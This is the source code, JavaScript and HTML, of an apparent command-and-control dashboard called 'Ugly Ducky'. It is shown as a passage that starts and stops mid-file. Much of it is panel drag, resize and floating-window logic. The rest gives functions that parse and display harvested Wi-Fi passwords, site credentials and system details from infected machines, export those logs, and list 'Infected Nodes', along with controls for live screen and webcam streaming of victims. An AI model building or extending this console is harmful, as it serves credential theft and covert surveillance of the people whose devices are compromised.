        const newHeader = header.cloneNode(true);
        header.parentNode.replaceChild(newHeader, header);
    });
    
    document.querySelectorAll('.drag-slot').forEach(slot => {
        const newSlot = slot.cloneNode(true);
        slot.parentNode.replaceChild(newSlot, slot);
    });

    document.querySelectorAll('.draggable-header').forEach(header => {
        header.addEventListener('dragstart', (e) => {
            if (isFloatingMode) { 
                e.preventDefault(); 
                return; 
            } // Prevent native HTML5 drag in float mode
            
            if (e.target.tagName === 'BUTTON' || e.target.closest('button') || header.parentElement.classList.contains('maximized') || e.target.tagName === 'SELECT' || e.target.tagName === 'INPUT') { 
                e.preventDefault(); 
                return; 
            }
            draggedPanel = header.closest('.drag-panel');
            e.dataTransfer.effectAllowed = 'move';
            e.dataTransfer.setData('text/plain', '');
            setTimeout(() => draggedPanel.classList.add('dragging'), 0);
        });
        
        header.addEventListener('dragend', () => {
            if(draggedPanel) {
                draggedPanel.classList.remove('dragging');
            }
            draggedPanel = null;
            document.querySelectorAll('.drag-slot').forEach(s => s.classList.remove('drag-over'));
        });
    });

    document.querySelectorAll('.drag-slot').forEach(slot => {
        slot.addEventListener('dragover', (e) => {
            e.preventDefault(); 
            if(draggedPanel && slot !== draggedPanel.parentElement) {
                slot.classList.add('drag-over');
            }
        });
        
        slot.addEventListener('dragleave', () => slot.classList.remove('drag-over'));
        
        slot.addEventListener('drop', (e) => {
            e.preventDefault();
            slot.classList.remove('drag-over');
            
            if (draggedPanel) {
                const targetPanel = slot.querySelector('.drag-panel');
                const sourceSlot = draggedPanel.parentElement;
                
                if (targetPanel && sourceSlot !== slot) {
                    sourceSlot.appendChild(targetPanel);
                    slot.appendChild(draggedPanel);
                } else if (!targetPanel && sourceSlot !== slot) {
                    slot.appendChild(draggedPanel); 
                }
            }
        });
    });
}

function initResizers() {
    setupResizer('rz-v1', 'col-left', 'col-mid', true);
    setupResizer('rz-v2', 'col-mid', 'col-right', true);
    
    setupResizer('rz-h-left', 'slot-1', 'slot-live', false);
    setupResizer('rz-h1', 'slot-2', 'slot-3', false);
    setupResizer('rz-h-right', 'slot-4', 'slot-fs', false);
}

function setupResizer(resizerId, prevId, nextId, isVertical) {
    const resizer = document.getElementById(resizerId);
    if(!resizer) {
        return; 
    }
    
    const prev = document.getElementById(prevId);
    const next = document.getElementById(nextId);
    
    resizer.addEventListener('mousedown', (e) => {
        e.preventDefault(); 
        resizer.classList.add('active');
        prev.style.transition = 'none'; 
        next.style.transition = 'none';

        const startPos = isVertical ? e.clientX : e.clientY;
        const parentSize = isVertical ? resizer.parentElement.offsetWidth : resizer.parentElement.offsetHeight;
        
        const prevStartBasis = (prev[isVertical ? 'offsetWidth' : 'offsetHeight'] / parentSize) * 100;
        const nextStartBasis = (next[isVertical ? 'offsetWidth' : 'offsetHeight'] / parentSize) * 100;

        const onMouseMove = (moveEvent) => {
            const delta = isVertical ? moveEvent.clientX - startPos : moveEvent.clientY - startPos;
            const deltaPercent = (delta / parentSize) * 100;
            let newPrev = prevStartBasis + deltaPercent; 
            let newNext = nextStartBasis - deltaPercent;
            
            if (newPrev > 15 && newNext > 15) {
                prev.style.flexBasis = `${newPrev}%`;
                next.style.flexBasis = `${newNext}%`;
            }
        };

        const onMouseUp = () => {
            resizer.classList.remove('active');
            prev.style.transition = ''; 
            next.style.transition = '';
            document.removeEventListener('mousemove', onMouseMove);
            document.removeEventListener('mouseup', onMouseUp);
        };
        
        document.addEventListener('mousemove', onMouseMove);
        document.addEventListener('mouseup', onMouseUp);
    });
}

window.toggleMinimize = function(btn, panelId) {
    const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
    const panel = document.getElementById(panelId);
    
    if(!panel || panel.classList.contains('maximized')) {
        return;
    }

    if (panel.dataset.minimized === 'true') {
        panel.dataset.minimized = 'false';
        buttonEl.innerHTML = '<i class="fa-solid fa-minus"></i>';
        panel.classList.remove('collapsed');
    } else {
        panel.dataset.minimized = 'true';
        buttonEl.innerHTML = '<i class="fa-solid fa-window-restore"></i>';
        panel.classList.add('collapsed');
    }
};

window.toggleMaximize = function(btn, panelId) {
    const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
    const panel = document.getElementById(panelId);
    if(!panel) {
        return;
    }
    
    if (panel.classList.contains('maximized')) {
        panel.classList.remove('maximized');
        buttonEl.innerHTML = '<i class="fa-solid fa-expand"></i>';
    } else {
        if(panel.dataset.minimized === 'true') {
            toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, panelId);
        }
        bringToFrontFloat(panel);
        panel.classList.add('maximized');
        buttonEl.innerHTML = '<i class="fa-solid fa-compress"></i>';
    }
};

window.resetLayout = function() {
    // If floating is active, turn it off and let the glide animation run before resetting grid
    floatingStates = {}; // Wipe memory
    if (isFloatingMode) {
        toggleFloatingMode();
    }
    
    document.getElementById('col-left').style.flexBasis = '25%';
    document.getElementById('col-mid').style.flexBasis = '50%';
    document.getElementById('col-right').style.flexBasis = '25%';
    
    const slots = ['slot-1', 'slot-live', 'slot-2', 'slot-3', 'slot-4', 'slot-fs'];
    slots.forEach(id => {
        if(document.getElementById(id)) {
            document.getElementById(id).style.flexBasis = '50%';
        }
    });
    
    document.querySelectorAll('.drag-panel').forEach(p => { 
        p.classList.remove('maximized', 'collapsed'); 
        p.dataset.minimized = 'false'; 
    });
    
    document.querySelectorAll('.draggable-header button .fa-window-restore').forEach(i => i.className = "fa-solid fa-minus");
    document.querySelectorAll('.draggable-header button .fa-compress').forEach(i => i.className = "fa-solid fa-expand");
    
    showToast('Layout Reset', 'success');
};

// ==========================================
// FLOATING WINDOW MANAGER (NEW LOGIC)
// ==========================================
window.toggleFloatingMode = function() {
    const btn = document.getElementById('btn-floating-toggle');
    const workspace = document.getElementById('workspace');
    const panels = document.querySelectorAll('.drag-panel');
    const wsRect = workspace.getBoundingClientRect();

    if (!isFloatingMode) {
        // --- TURNING ON FLOATING MODE ---
        isFloatingMode = true;
        btn.innerHTML = '<i class="fa-solid fa-clone mr-1"></i> Float: <span class="text-neon">ON</span>';
        btn.classList.add('border-neon', 'text-white');
        btn.classList.remove('border-gray-700', 'text-gray-300');
        
        // This is critical: Detaches slots from relative positioning, making workspace the anchor for absolute elements
        workspace.classList.add('floating-active'); 

        panels.forEach(p => {
            // Step 1: Capture current visual position (Flex Grid origin)
            const rect = p.getBoundingClientRect();
            const startLeft = rect.left - wsRect.left;
            const startTop = rect.top - wsRect.top;
            const startWidth = rect.width;
            const startHeight = rect.height;

            // Step 2: Apply floating classes
            p.classList.add('floating-panel');
            
            // Step 3: Immediately lock panels exactly where they are visually to prevent jumping
            p.style.left = startLeft + 'px';
            p.style.top = startTop + 'px';
            p.style.width = startWidth + 'px';
            p.style.height = startHeight + 'px';
            
            // Inject a resize handle into bottom right corner of panel
            if (!p.querySelector('.resize-handle')) {
                const handle = document.createElement('div');
                handle.className = 'resize-handle';
                p.appendChild(handle);
            }

            // Step 4: Check memory. Do we have a saved layout to GLIDE into?
            const saved = floatingStates[p.id];
            if (saved && !p.classList.contains('maximized')) {
                p.offsetHeight; // Force reflow to acknowledge starting coordinates
                p.classList.add('gliding'); // Add smooth CSS transitions
                
                // Set the target coordinates (The glide)
                p.style.left = saved.left;
                p.style.top = saved.top;
                p.style.width = saved.width;
                p.style.height = saved.height;
                p.style.zIndex = saved.zIndex;

                setTimeout(() => p.classList.remove('gliding'), 400); // Clean up transitions after 400ms
            } else {
                p.style.zIndex = ++floatZIndex;
            }

            // Step 5: Disable the native HTML5 drag-and-drop to let free-dragging work
            const header = p.querySelector('.draggable-header');
            if (header) header.setAttribute('draggable', 'false');
        });

        showToast('Free Floating Mode Enabled', 'success');

    } else {
        // --- TURNING OFF FLOATING MODE (GLIDING BACK TO GRID) ---
        isFloatingMode = false;
        btn.innerHTML = '<i class="fa-solid fa-clone mr-1"></i> Float: OFF';
        btn.classList.remove('border-neon', 'text-white');
        btn.classList.add('border-gray-700', 'text-gray-300');

        // FLIP ANIMATION TECHNIQUE: (First, Last, Invert, Play)
        
        // 1. FIRST: Capture current floating layout and save to memory
        const firstRects = new Map();
        panels.forEach(p => {
            const rect = p.getBoundingClientRect();
            firstRects.set(p, { left: rect.left - wsRect.left, top: rect.top - wsRect.top, width: rect.width, height: rect.height });
            
            if (!p.classList.contains('maximized')) {
                floatingStates[p.id] = {
                    left: p.style.left,
                    top: p.style.top,
                    width: p.style.width,
                    height: p.style.height,
                    zIndex: p.style.zIndex
                };
            }
        });

        // 2. Clear floating rules instantly to let browser calculate native Flex Grid layout
        workspace.classList.remove('floating-active');
        panels.forEach(p => {
            p.classList.remove('floating-panel');
            p.style.left = ''; p.style.top = ''; p.style.width = ''; p.style.height = ''; p.style.zIndex = '';
            const handle = p.querySelector('.resize-handle');
            if (handle) handle.remove();
        });

        // 3. LAST: Capture where the Flex Grid naturally puts them
        const lastRects = new Map();
        panels.forEach(p => {
            const rect = p.getBoundingClientRect();
            lastRects.set(p, { left: rect.left - wsRect.left, top: rect.top - wsRect.top, width: rect.width, height: rect.height });
        });

        // 4. INVERT: Instantly force them BACK into floating mode at their FIRST positions
        workspace.classList.add('floating-active');
        panels.forEach(p => {
            const first = firstRects.get(p);
            p.classList.add('floating-panel');
            p.style.left = first.left + 'px';
            p.style.top = first.top + 'px';
            p.style.width = first.width + 'px';
            p.style.height = first.height + 'px';
        });

        // 5. PLAY: Add glide transition and aim for the LAST positions
        panels.forEach(p => {
            p.offsetHeight; // Force reflow
            p.classList.add('gliding');
            const last = lastRects.get(p);
            p.style.left = last.left + 'px';
            p.style.top = last.top + 'px';
            p.style.width = last.width + 'px';
            p.style.height = last.height + 'px';
        });

        // 6. Cleanup: Once transition is over (400ms), truly restore natural Flex layout
        setTimeout(() => {
            workspace.classList.remove('floating-active');
            panels.forEach(p => {
                p.classList.remove('gliding', 'floating-panel');
                p.style.left = ''; p.style.top = ''; p.style.width = ''; p.style.height = '';
                
                const header = p.querySelector('.draggable-header');
                if (header) header.setAttribute('draggable', 'true');
            });
            // Poke Leaflet to fix its size safely
            if (leafletMap) leafletMap.invalidateSize(true);
        }, 400);

        showToast('Grid Tiling Layout Restored', 'success');
    }
};

function initFloatingWindowManager() {
    document.addEventListener('mousedown', (e) => {
        if (!isFloatingMode) return;
        
        const resizeHandle = e.target.closest('.resize-handle');
        const header = e.target.closest('.draggable-header');
        
        if (resizeHandle) {
            const panel = resizeHandle.closest('.drag-panel');
            if (panel.classList.contains('maximized') || panel.classList.contains('collapsed')) return;
            
            isResizingFloat = true;
            activeFloatPanel = panel;
            bringToFrontFloat(activeFloatPanel);
            
            floatStartX = e.clientX;
            floatStartY = e.clientY;
            const rect = activeFloatPanel.getBoundingClientRect();
            panelStartWidth = rect.width;
            panelStartHeight = rect.height;
            e.preventDefault();
            
        } else if (header && !e.target.closest('button') && !e.target.closest('select') && !e.target.closest('input')) {
            const panel = header.closest('.drag-panel');
            if (panel.classList.contains('maximized')) return;
            
            isDraggingFloat = true;
            activeFloatPanel = panel;
            bringToFrontFloat(activeFloatPanel);
            
            floatStartX = e.clientX;
            floatStartY = e.clientY;
            panelStartLeft = parseFloat(activeFloatPanel.style.left) || 0;
            panelStartTop = parseFloat(activeFloatPanel.style.top) || 0;
            e.preventDefault();
        }
    });

    document.addEventListener('mousemove', (e) => {
        if (!isFloatingMode || !activeFloatPanel) return;
        
        if (isDraggingFloat) {
            const dx = e.clientX - floatStartX;
            const dy = e.clientY - floatStartY;
            activeFloatPanel.style.left = `${panelStartLeft + dx}px`;
            activeFloatPanel.style.top = `${panelStartTop + dy}px`;
        } else if (isResizingFloat) {
            const dx = e.clientX - floatStartX;
            const dy = e.clientY - floatStartY;
            activeFloatPanel.style.width = `${Math.max(250, panelStartWidth + dx)}px`;
            activeFloatPanel.style.height = `${Math.max(150, panelStartHeight + dy)}px`;
        }
    });

    document.addEventListener('mouseup', () => {
        if (isDraggingFloat || isResizingFloat) {
            isDraggingFloat = false;
            isResizingFloat = false;
            activeFloatPanel = null;
        }
    });
}

function bringToFrontFloat(panel) {
    if(!isFloatingMode) return;
    panel.style.zIndex = ++floatZIndex;
}

// ==========================================
// VAULT CARD RENDERING
// ==========================================
function buildFilters() {
    const container = document.getElementById('filterContainer');
    container.innerHTML = '';
    container.classList.remove('hidden');

    const categories = [...new Set(globalData.map(item => item.category))];
    container.appendChild(createFilterBtn('All', true));
    categories.forEach(cat => container.appendChild(createFilterBtn(cat, false)));
}

function createFilterBtn(text, isActive) {
    const btn = document.createElement('button');
    const activeClasses = 'bg-cyberBlue/20 text-cyberBlue font-bold border-cyberBlue shadow-[0_0_10px_rgba(0,210,211,0.2)]';
    const inactiveClasses = 'bg-[#0f1423] text-gray-400 border-gray-700 hover:text-white hover:border-gray-500';
    
    btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${isActive ? activeClasses : inactiveClasses}`;
    btn.innerText = text;
    
    btn.onclick = () => {
        document.querySelectorAll('.filter-btn').forEach(b => b.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${inactiveClasses}`);
        btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${activeClasses}`;
        
        if (text === 'All') {
            renderCards(globalData, document.getElementById('output'));
        } else {
            renderCards(globalData.filter(item => item.category === text), document.getElementById('output'));
        }
    };
    return btn;
}

function renderCards(data, outputDiv) {
    outputDiv.innerHTML = '';
    
    data.forEach((item, index) => {
        let icon = 'fa-file-code'; 
        let color = 'text-neon';
        
        if(item.category.includes('Wi-Fi')) { icon = 'fa-wifi'; color = 'text-blue-400'; }
        if(item.category.includes('System')) { icon = 'fa-server'; color = 'text-green-400'; }
        if(item.category.includes('Password') || item.category.includes('Cred')) { icon = 'fa-key'; color = 'text-yellow-400'; }
        if(item.category.includes('Discord')) { icon = 'fa-discord'; color = 'text-indigo-400'; }

        const panelId = `vault-panel-${index}`;
        const htmlContent = parseToHTML(item.category, item.content);
        
        const slot = document.createElement('div');
        slot.className = "drag-slot fade-in h-[400px]"; 
        slot.style.animationDelay = `${index * 0.05}s`;
        
        slot.innerHTML = `
            <div id="${panelId}" class="drag-panel" data-minimized="false">
                <div class="draggable-header px-4 py-3 border-b border-gray-800 flex justify-between items-center bg-[#050810] rounded-t-[0.75rem]" draggable="true">
                    <div class="flex items-center gap-2 pointer-events-none">
                        <i class="fa-solid ${icon} ${color}"></i>
                        <h3 class="font-bold text-gray-200 text-xs uppercase tracking-widest">${item.category}</h3>
                    </div>
                    <div class="flex gap-2">
                        <button onclick="toggleMinimize(this, '${panelId}')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 hover:bg-yellow-500 hover:text-white flex items-center justify-center text-[8px]">
                            <i class="fa-solid fa-minus"></i>
                        </button>
                        <button onclick="toggleMaximize(this, '${panelId}')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]">
                            <i class="fa-solid fa-expand"></i>
                        </button>
                    </div>
                </div>
                <div class="win-content flex flex-col bg-[#0f1423] rounded-b-[0.75rem] h-full relative">
                    <div class="absolute top-2 right-2 z-10 flex gap-2">
                        <span class="text-[10px] font-mono text-gray-500 bg-black/60 px-2 py-1 rounded">
                            ${new Date(item.created_at).toLocaleDateString()}
                        </span>
                        <button onclick="copyData(this)" class="bg-gray-800 hover:bg-gray-700 text-white rounded px-2 py-1 transition-colors text-[10px]" title="Copy Raw">
                            <i class="fa-regular fa-copy"></i>
                        </button>
                    </div>
                    <div class="p-0 flex-grow overflow-y-auto mt-6">
                        <textarea class="hidden-raw-data hidden">${item.content}</textarea>
                        ${htmlContent}
                    </div>
                </div>
            </div>
        `;
        outputDiv.appendChild(slot);
    });
    
    initDragAndDrop(); 
}

function parseToHTML(category, content) {
    let defaultRaw = `<pre class="p-4 font-mono text-xs text-cyberBlue whitespace-pre-wrap break-all">${escapeHtml(content)}</pre>`;
    
    try {
        if (category.includes('Wi-Fi')) {
            const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
            let rows = blocks.map(block => {
                let ssid = (block.match(/SSID:\s*(.*)/i) || [])[1] || 'Unknown';
                let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
                
                return `
                    <tr class="border-b border-gray-800/50 hover:bg-white/5">
                        <td class="px-4 py-2.5 text-blue-400 font-bold w-1/2 break-all">${escapeHtml(ssid)}</td>
                        <td class="px-4 py-2.5 font-mono text-white blur-reveal rounded w-1/2 break-all">${escapeHtml(pass)}</td>
                    </tr>
                `;
            }).join('');
            
            if (rows) {
                return `
                    <table class="w-full text-left text-xs table-fixed">
                        <thead class="bg-[#050810] text-gray-500">
                            <tr>
                                <th class="p-2 pl-4 w-1/2">Network (SSID)</th>
                                <th class="p-2 w-1/2">Password</th>
                            </tr>
                        </thead>
                        <tbody>${rows}</tbody>
                    </table>
                `;
            }
        }
        
        if (category.includes('Password') || category.includes('Cred')) {
            const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
            let rows = blocks.map(block => {
                let url = (block.match(/(?:URL|HOST):\s*(.*)/i) || [])[1] || 'N/A';
                let user = (block.match(/USER:\s*(.*)/i) || [])[1] || 'N/A';
                let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
                
                return `
                    <tr class="border-b border-gray-800/50 hover:bg-white/5">
                        <td class="p-2 pl-3 text-yellow-400 truncate w-1/3" title="${escapeHtml(url)}">${escapeHtml(url)}</td>
                        <td class="p-2 text-gray-300 truncate w-1/3">${escapeHtml(user)}</td>
                        <td class="p-2 font-mono text-white blur-reveal rounded w-1/3 truncate">${escapeHtml(pass)}</td>
                    </tr>
                `;
            }).join('');
            
            if (rows) {
                return `
                    <table class="w-full text-left text-xs table-fixed">
                        <thead class="bg-[#050810] text-gray-500">
                            <tr>
                                <th class="p-2 pl-3 w-1/3">Target</th>
                                <th class="p-2 w-1/3">User</th>
                                <th class="p-2 w-1/3">Pass</th>
                            </tr>
                        </thead>
                        <tbody>${rows}</tbody>
                    </table>
                `;
            }
        }
        
        if (category.includes('System')) {
            const lines = content.split('\n').filter(l => l.trim().length > 0);
            let gridItems = lines.map(line => {
                let parts = line.includes(':') ? line.split(':') : line.split('=');
                
                if (parts.length >= 2) {
                    let key = parts.shift().trim(); 
                    let val = parts.join(':').trim();
                    
                    return `
                        <div class="bg-[#050810] p-2.5 rounded border border-gray-800/80">
                            <div class="text-gray-500 text-[9px] font-bold uppercase tracking-wider mb-0.5">${escapeHtml(key)}</div>
                            <div class="text-green-400 font-mono text-[11px] truncate">${escapeHtml(val)}</div>
                        </div>
                    `;
                } 
                return '';
            }).join('');
            
            if (gridItems) {
                return `<div class="p-3 grid grid-cols-2 gap-2">${gridItems}</div>`;
            }
        }
        
    } catch (e) { 
        return defaultRaw; 
    }
    
    return defaultRaw;
}

function escapeHtml(unsafe) { 
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
}

window.copyData = function(btnElement) {
    const dataToCopy = btnElement.closest('.drag-panel').querySelector('.hidden-raw-data').value;
    navigator.clipboard.writeText(dataToCopy).then(() => {
        showToast("Raw payload copied to clipboard");
        const icon = btnElement.querySelector('i');
        icon.className = "fa-solid fa-check text-green-400";
        
        setTimeout(() => {
            icon.className = "fa-regular fa-copy";
        }, 2000);
    });
};

window.exportLogs = function() {
    if (globalData.length === 0) {
        return showToast("No data to export.", "error");
    }
    
    const deviceId = document.getElementById('deviceId').value.trim() || 'export';
    const jsonData = JSON.stringify(globalData, null, 2);
    const blob = new Blob([jsonData], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    
    const a = document.createElement('a');
    a.href = url;
    a.download = `ducky_logs_${deviceId}.json`;
    
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showToast("Logs exported.");
};
```

### --- START OF FILE text/html ---
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ugly Ducky | C2 Command Center</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Leaflet.js Interactive Map Engine-->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = { theme: { extend: { fontFamily: { sans: ['Inter', 'sans-serif'], mono: ['JetBrains Mono', 'monospace'], }, colors: { dark: '#050810', panel: '#0f1423', neon: '#ff4757', neonHover: '#ff6b81', cyberBlue: '#00d2d3' } } } }
    </script>
    <link rel="stylesheet" href="style.css">
</head>
<body class="h-screen flex flex-col font-sans antialiased selection:bg-neon selection:text-white overflow-hidden">

    <nav class="glass-panel border-b border-gray-800/80 sticky top-0 z-50 flex-shrink-0">
        <div class="max-w-[98%] mx-auto px-4">
            <div class="flex items-center justify-between h-14">
                <div class="flex items-center gap-3 flex-1">
                    <i class="fa-solid fa-duck text-neon text-2xl text-glow"></i>
                    <span class="font-bold text-xl tracking-wider text-white uppercase">Ugly<span class="text-neon">Ducky</span> <span class="text-xs text-gray-500 font-mono tracking-normal ml-2 hidden sm:inline-block">v2.5.0_TILING</span></span>
                </div>
                <div class="flex-none flex justify-center">
                    <div class="p-1 rounded-lg inline-flex gap-1 border border-gray-800 bg-[#050810]">
                        <button onclick="switchTab('extraction')" id="tab-extraction" class="px-6 py-1 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5"><i class="fa-solid fa-database mr-2"></i> Vault Extraction</button>
                        <button onclick="switchTab('rat')" id="tab-rat" class="px-6 py-1 rounded-md font-semibold text-sm transition-all bg-neon text-white shadow-[0_0_15px_rgba(255,71,87,0.3)]"><i class="fa-solid fa-network-wired mr-2"></i> C2 Live Control</button>
                    </div>
                </div>
                <div class="hidden md:flex items-center gap-6 font-mono text-xs flex-1 justify-end">
                    <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-green-500 shadow-[0_0_8px_#22c55e] animate-pulse"></span> <span class="text-gray-300">SERVER: ONLINE</span></div>
                    <div class="flex items-center gap-2 text-gray-400"><i class="fa-solid fa-shield-halved text-neon"></i> SEC: ENCRYPTED</div>
                </div>
            </div>
        </div>
    </nav>

    <main class="flex-grow max-w-[98%] mx-auto px-2 py-4 w-full flex flex-col min-h-0">
        
        <!-- EXTRACTION TAB -->
        <div id="view-extraction" class="tab-content h-full overflow-y-auto no-scrollbar pb-10">
            <div class="text-center mb-6 pt-4">
                <h1 class="text-4xl md:text-5xl font-bold text-white mb-3 tracking-tight">Secure <span class="text-neon text-glow">Vault</span></h1>
                <p class="text-gray-400 font-mono text-sm">Awaiting authentication parameters to decrypt harvested logs...</p>
            </div>
            <div class="max-w-2xl mx-auto w-full glass-panel p-8 rounded-2xl border border-gray-800 mb-6 relative overflow-hidden flex-shrink-0">
                <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-cyberBlue to-transparent opacity-50"></div>
                <label class="block text-xs font-bold text-cyberBlue mb-3 uppercase tracking-widest"><i class="fa-solid fa-microchip mr-2"></i>Target Identifier</label>
                <div class="flex flex-col sm:flex-row gap-3">
                    <div class="relative flex-grow">
                        <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none"><i class="fa-solid fa-fingerprint text-gray-500"></i></div>
                        <input type="text" id="deviceId" placeholder="Enter Ducky ID" autocomplete="off" class="block w-full pl-12 pr-4 py-4 bg-[#050810] border border-gray-700 rounded-lg text-white font-mono text-lg shadow-inner outline-none focus:border-cyberBlue transition-colors">
                    </div>
                    <button onclick="fetchData()" id="connectBtn" class="bg-cyberBlue hover:bg-teal-400 text-dark font-bold py-4 px-8 rounded-lg transition-all shadow-[0_0_20px_rgba(0,210,211,0.4)]">
                        <i class="fa-solid fa-unlock-keyhole mr-2"></i> Decrypt
                    </button>
                </div>
                <div class="flex justify-between items-center mt-4">
                    <p id="statusMsg" class="text-sm font-mono text-gray-400 hidden"></p>
                    <button id="exportBtn" onclick="exportLogs()" class="hidden text-xs font-mono bg-gray-800 hover:bg-gray-700 text-white px-3 py-1.5 rounded transition-colors"><i class="fa-solid fa-download mr-1"></i> Export Logs</button>
                </div>
            </div>
            <div id="filterContainer" class="hidden max-w-7xl mx-auto w-full mb-4 flex flex-wrap gap-2 justify-center pb-4 flex-shrink-0"></div>
            <div id="output" class="grid grid-cols-1 lg:grid-cols-2 2xl:grid-cols-3 w-full" style="margin: -0.75rem; width: calc(100% + 1.5rem);"></div>
        </div>

        <!-- RAT TAB (TILING WM) -->
        <div id="view-rat" class="tab-content active h-full flex flex-col min-h-0">
            <div class="flex justify-between items-center mb-2 px-2 flex-shrink-0">
                <div class="font-mono text-xs text-cyberBlue"><i class="fa-solid fa-border-all mr-2"></i>Hypr-Tiling Active</div>
                <div class="flex gap-2">
                    <button id="btn-floating-toggle" onclick="toggleFloatingMode()" class="px-3 py-1 bg-gray-800 hover:bg-gray-700 text-gray-300 text-[10px] font-mono rounded border border-gray-700 transition-colors"><i class="fa-solid fa-clone mr-1"></i> Float: OFF</button>
                    <button onclick="resetLayout()" class="px-3 py-1 bg-gray-800 hover:bg-gray-700 text-gray-300 text-[10px] font-mono rounded border border-gray-700 transition-colors"><i class="fa-solid fa-rotate-left mr-1"></i> Reset Grid</button>
                </div>
            </div>

            <div id="workspace" class="flex-grow flex w-full relative min-h-0">
                <!-- COLUMN LEFT -->
                <div id="col-left" class="tiling-col" style="flex-basis: 25%;">
                    <div class="drag-slot" id="slot-1" style="flex-basis: 50%;">
                        <div id="panel-targets" class="drag-panel" data-minimized="false">
                            <div class="draggable-header p-2 border-b border-gray-800 bg-[#0f1423] flex justify-between items-center rounded-t-[0.75rem]" draggable="true">
                                <h2 class="font-bold text-xs tracking-wider uppercase text-gray-300 pointer-events-none"><i class="fa-solid fa-crosshairs text-neon mr-2 text-glow"></i>Infected Nodes</h2>
                                <div class="flex gap-2 flex-shrink-0">
                                    <button onclick="toggleMinimize(this, 'panel-targets')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 hover:bg-yellow-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-minus"></i></button>
                                    <button onclick="toggleMaximize(this, 'panel-targets')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-expand"></i></button>
                                </div>
                            </div>
                            <div class="win-content p-2 space-y-2 bg-[#050810]/50 rounded-b-[0.75rem]" id="nodes-list"></div>
                        </div>
                    </div>
                    
                    <div class="resizer-h" id="rz-h-left"></div>
                    
                    <div class="drag-slot" id="slot-live" style="flex-basis: 50%;">
                        <div id="panel-live" class="drag-panel" data-minimized="false">
                            <div class="draggable-header p-2 border-b border-gray-800 bg-[#0f1423] flex justify-between items-center rounded-t-[0.75rem]" draggable="true">
                                <h2 class="font-bold text-[10px] tracking-wider uppercase text-gray-300 pointer-events-none truncate" id="liveViewTitle"><i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Live Stream</h2>
                                <div class="flex gap-2 flex-shrink-0">
                                    <button id="streamToggleBtn" onclick="toggleStream()" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]" title="Play Stream"><i class="fa-solid fa-play"></i></button>
                                    <button onclick="toggleMinimize(this, 'panel-live')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 hover:bg-yellow-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-minus"></i></button>
                                    <button onclick="toggleMaximize(this, 'panel-live')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-expand"></i></button>
                                </div>
                            </div>
                            
                            <!-- NATIVE LIVE CONTROLS -->
                            <div class="p-1 border-b border-gray-800 bg-[#050810] flex justify-between items-center flex-shrink-0 gap-1">
                                <select id="streamTarget" class="bg-[#0f1423] text-[9px] text-gray-300 border border-gray-700 rounded px-1 py-0.5 outline-none cursor-pointer flex-grow">
                                    <option value="SCREEN_-1">All Screens</option>
                                    <option value="SCREEN_0">Monitor 1</option>
                                    <option value="SCREEN_1">Monitor 2</option>
                                    <option value="SCREEN_2">Monitor 3</option>
                                    <option value="WEBCAM">Webcam Feed</option>
                                </select>
                                <div class="flex items-center gap-1 bg-[#0f1423] border border-gray-700 px-1.5 py-0.5 rounded">
                                    <span class="text-[9px] text-gray-500"><i class="fa-solid fa-image"></i></span>
                                    <input type="range" id="streamQuality" min="10" max="90" step="10" value="30" onchange="changeStreamQuality(this.value)" class="w-12 h-1 bg-gray-600 rounded-lg appearance-none cursor-pointer">
                                    <span id="qualityLabel" class="text-[9px] text-cyberBlue font-mono w-6 text-right">Q:30</span>
                                </div>
                            </div>
                            
                            <!-- VIEWER -->
                            <div class="win-content bg-black relative flex flex-col justify-center items-center rounded-b-[0.75rem] overflow-hidden">
                                <img id="liveViewImage" src="" alt="Live feed" class="max-w-full max-h-full object-contain hidden z-10">
                                <div id="liveViewSpinner" class="text-center absolute inset-0 flex flex-col items-center justify-center z-0">
                                     <i class="fa-solid fa-satellite-dish text-gray-700 text-3xl mb-2"></i>
                                     <p class="text-gray-500 font-mono text-[10px] mt-2">Stream Idle</p>
                                </div>
